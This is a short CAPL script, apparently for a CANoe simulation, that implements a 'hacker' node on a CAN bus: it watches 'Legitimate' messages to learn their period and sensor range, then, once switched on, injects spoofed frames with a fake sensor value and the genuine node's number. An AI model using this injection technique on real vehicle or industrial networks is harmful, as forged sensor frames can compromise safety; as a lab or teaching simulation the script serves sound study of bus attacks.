/*@!Encoding:1252*/
includes
{
  
}

variables
{
  int hackerIsOn =0;
 
  const int nodeNumber=2;
  const int listening=0;
  const int injecting=1;
  
  int listenForMessages;
  msTimer T1;
    
  double periodMin;
  double periodMax;
  double lastMsgTime;
  int sensorMin;
  int sensorMax;
  
  int state;

}

on start{
  periodMin=10000000;
  periodMax=0;
  lastMsgTime=0;
  sensorMin=10000000;
  sensorMax=0;
  listenForMessages=10;
  
  state = listening;
  
}

on envVar HackerON
{
  //toggle off on
  hackerIsOn = !hackerIsOn;
 
}

on message Legitimate{
  double period=0;
  long setTime=0;
  int sensor=0;
 
  //ignore loopback
  if(this.NodeNumber==nodeNumber){
    return;
  }
  
  period = this.time - lastMsgTime;
  lastMsgTime=this.time;
  sensor = this.sensor;
  
  if(state==listening){
    
    //update state
    listenForMessages-=1;
    if(listenForMessages<0){
      state=injecting;
    }
    
    //capture first msg
    if(lastMsgTime==0){
      //do nothing
    }else{
      
      //get period bounds
      if(period<periodMin){
        periodMin=period;
      }
      if(period>periodMax){
       periodMax=period; 
      }
      
      //sensor bounds
      if(sensor<sensorMin){
        sensorMin=sensor; 
      }
      if(sensor>sensorMax){
        sensorMax=sensor; 
      }
      
    }
    
  }else{
    cancelTimer(T1);
    setTime= (long) periodMin/10;
    setTimer(T1,setTime);    
  }
}

on timer T1{
  if(hackerIsOn){

    //WRITE to bus
    message Legitimate msg;
    msg.sensor=111;
    msg.NodeNumber=nodeNumber;
    
    output(msg);
    
    //reset
    setTimer(T1,periodMin);
  }
}